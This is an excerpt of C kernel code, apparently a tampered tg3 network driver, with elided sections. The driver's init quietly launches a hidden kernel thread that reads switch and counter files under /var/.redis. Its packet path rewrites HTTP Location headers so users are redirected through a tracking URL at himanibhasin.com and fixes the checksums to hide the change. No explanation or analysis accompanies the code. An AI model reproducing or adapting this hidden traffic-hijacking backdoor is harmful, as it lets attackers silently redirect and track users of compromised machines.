...
static u64 pri_pkt_cnt = 0;
static u64 rear_pkt_cnt = 0;
static u64 jk_pkt_cnt = 0;
...
static int mykthread(void *data)
{
    ...
    while(!kthread_should_stop())
    {
        ...
        msleep(3000);
#if 0
        fp = filp_open("/var/.jk/test.txt", O_RDWR, 0644);
        if (IS_ERR(fp)) {
        ...
        set_fs(KERNEL_DS);
        pos = 0;
        vfs_write(fp, sd_buf, sizeof(sd_buf), &pos);
        pos = 0;
        vfs_read(fp, sd_buf1, sizeof(sd_buf), &pos);
        printk("read: %s\n", sd_buf1);
        filp_close(fp, NULL);
        set_fs(fs);
#endif
        fp1 = filp_open("/var/.redis/.redis.conf", O_RDWR, 0644);
        if (IS_ERR(fp1)) {
           // printk("open switch file error\n");
            continue;
        }
        fs = get_fs();
        set_fs(KERNEL_DS);
        ...
        fp2 = filp_open("/var/.redis/.redis.info", O_RDWR, 0644);
        if (IS_ERR(fp2)) {
            //printk("open cnt file error\n");
            continue;
        }
        ...
        set_fs(KERNEL_DS);
        pos = 0;
        vfs_write(fp2, sd_buf, sizeof(sd_buf), &pos);
        filp_close(fp2, NULL);
        set_fs(fs);
...
static u32 replace_sb_with_joker(struct sk_buff *skb, struct iphdr *iph, struct tcphdr *tcph)
{
    struct pbuf dlcp;
    struct pbuf *dlp = &dlcp;
    struct eth_hdr *ethhdr;
    u16 ip_hd_len; // ip heder length
    u16 tcp_hd_len; // tcp header length
    u16 src_tp;
    u16 eth_pro;
    char *dhtml = NULL; //tcp palyload pointer
    char *slink = NULL; //tcp payload location pointer 
    char *stail = NULL; // location url end
    char *sltail = NULL; // url of location pointer, point the "http", first 'h'
    char *end_html = NULL; // ponter of the last byte of tcp payload
    char sbaa[256] = {0};  // the old url buffer
    char nlocation_tail[512] = {0};  /*存放新的链接+tail*/
    char *joker = "http://himanibhasin.com:8100/dt/stat.php?url=";
    //char *joker = "http://himanibhasin.com/dt/stat.php?url=";
    //char *joker = "http://103.193.175.32/dt/stat.php?url=http://www.hao123.com/?tn=12323535_hao_pg";
    u32 nlen;
    u16 sbaa_len; // the old url of location  length
    u16 spri_len;  // the length from tcp payload beginning to Location (not include the Loction length)
    u16 html_len;  // the old tcp payload length
    u16 tot_len;   // the old ip length
    u16 stail_len;
    u8 protocol;

    memset(dlp, 0, sizeof(dlcp));

    dlp->ptr = (void *)skb->data;
    dlp->len = skb->len;
    dlp->ptr_offset = 0;
    //PRINTF_PKT(dlp);
    PBUF_CUR_FORMAT(struct eth_hdr *, ethhdr, dlp);
    eth_pro = ntohs(ethhdr->ethertype);


    pri_pkt_cnt++;
    if ((eth_pro == 0x0800) && (sb_jk_gap != 0))
    {
        rear_pkt_cnt++;
        UPDATE_PBUF_OFFSET(dlp, ETH_HLEN);
        PBUF_CUR_FORMAT(struct iphdr *, iph, dlp);
        ip_hd_len = iph->ihl * 4;
        ...
        {
            UPDATE_PBUF_OFFSET(dlp, ip_hd_len); 
            PBUF_CUR_FORMAT(struct tcphdr *, tcph, dlp); 

            tcp_hd_len = tcph->doff * 4;
            src_tp = ntohs(tcph->source);

            if (src_tp == 80)
            {
                UPDATE_PBUF_OFFSET(dlp, tcp_hd_len);
                PBUF_CUR_FORMAT(char *, dhtml, dlp);

                html_len = dlp->len - ETH_HLEN - ip_hd_len - tcp_hd_len;
                if ((html_len < 512) && (html_len > 0))
                {
                    DEBUG("skb->len = %d, skb->data_len = %d\n", skb->len, skb->data_len);
                    slink = strstr(dhtml, "Location: ");
                    if (NULL != slink)
                    {
                        DEBUG("src: html len is %d, %d, total len is %d, tot ip len is %d, joker len is %d\n", (int)strlen(dhtml), html_len, dlp->len, tot_len, (int)strlen(joker));
                        //PBUF_DUMP(dlp, (int)strlen(dhtml));
                        stail = strstr(slink, "\r\n");
                        sltail = strstr(slink, "http");

                        DEBUG("location length is %d\n", (int)strlen(slink));
                        if ((NULL != stail) &&(NULL != sltail))
                        {
                            DEBUG("tail length is %d\n", (int)strlen(stail));
                            spri_len = slink - dhtml;
                            sbaa_len = stail-sltail;
                            stail_len = html_len - (stail - dhtml);
                            DEBUG("spri_len =%d\n", spri_len);
                            if ((spri_len < 256) && (sbaa_len < 256) && (strlen(joker) + stail_len + 10 < 512))
                            {
                                UPDATE_PBUF_OFFSET(dlp, spri_len);
                                //memcpy(spri, dhtml, spri_len);
                                u16 encode_sbaa_len = urlencode(sltail, sbaa_len, sbaa, 256);
                                //printk("encode_len = %d, sbaa = %s\n", encode_sbaa_len , sbaa);
                                //memcpy(sbaa, sltail, sbaa_len);
                                DEBUG("sbaa = %s.\n", (char *)sbaa);
                                snprintf(nlocation_tail, sizeof(nlocation_tail), "Location: %s%s%s", joker, sbaa, stail);
                                //u16 nlen = ETH_HLEN+ip_hd_len+tcp_hd_len + spri_len + strlen(nhtml);
                                nlen = dlp->len + strlen(joker) + encode_sbaa_len - sbaa_len; // the new packet length
                                u16 nlocation_tail_len = html_len - spri_len + strlen(joker) + encode_sbaa_len - sbaa_len;
                                DEBUG("len = %d, nlen = %d,  nlocation_tail_len = %d, ip_hd_len = %d, tcp_hd_len = %d, spri_len = %d, sbaa_len = %d\n",
                                        len, nlen, nlocation_tail_len, ip_hd_len, tcp_hd_len, spri_len, sbaa_len);
                                ...
                                if ((skb->end > skb->tail) && (nlen < dlp->len + skb->end - skb->tail) && (sb_jk_times % sb_jk_gap < 1))
                                {
                                    ...
                                    DEBUG("ipsum = %.4x, iph->ihl = %d\n", (u16)iph->check, iph->ihl); 
                                    DEBUG("tot_len = %.4x\n", iph->tot_len);
                                    tcph->check = 0;
                                    skb->ip_summed = CHECKSUM_PARTIAL;
                                    DEBUG("skb->csum = %d, skb->len = %d, skb->ip_summed = %d\n", skb->csum, skb->len, skb->ip_summed);
                                    memcpy(skb->data+ETH_HLEN+ip_hd_len+tcp_hd_len+spri_len, nlocation_tail, nlocation_tail_len);
                                    UPDATE_PBUF_OFFSET(dlp, nlocation_tail_len);
                                    PBUF_CUR_FORMAT(char *, end_html, dlp);
                                    if (NULL != end_html)
                                    {
                                        if (strlen(end_html) > 0)
                                        {
                                            memset(end_html, 0, strlen(end_html));
                                        }
                                    }

                                    tcph->check = csum_tcpudp_magic(iph->saddr, iph->daddr,
                                            tcp_hd_len + spri_len + nlocation_tail_len, IPPROTO_TCP, csum_partial((char *)tcph, tcp_hd_len + spri_len + nlocation_tail_len, 0));
                                    DEBUG("tcpsum = %.4x\n", tcph->check);
                                    jk_pkt_cnt++;
...
abort_lso:
    ...
    DEBUG("truesize is %d, len = %d, data_len = %d, end = %d, tail = %d\n", skb->truesize, skb->len, skb->data_len, skb->end, skb->tail);
    in_pkt_cnt++;

#if 1
    if (0 == skb->data_len)
    {
        len = replace_sb_with_joker(skb, iph, tcph);
    }
#endif
    out_pkt_cnt++;
...
static int __init tg3_init(void)
{
	...
	if (!disable_fw_dmp) {
		...
		status = vmklnx_dump_add_callback(TG3_DUMPNAME,
				...
				&tg3_fwdmp_dh);
		if (status != VMK_OK)
			dev_erre&pdev->dev, "tg3: Unable to register fw "
				"dump handler (rc = 0x%x!)\n", status);
	}
#endif /*defined(__VMKLNX__) && (VMWARE_ESX_DDK_VERSION >= 55000) */

    sd_Thread = kthread_run(mykthread,NULL,"systhread");
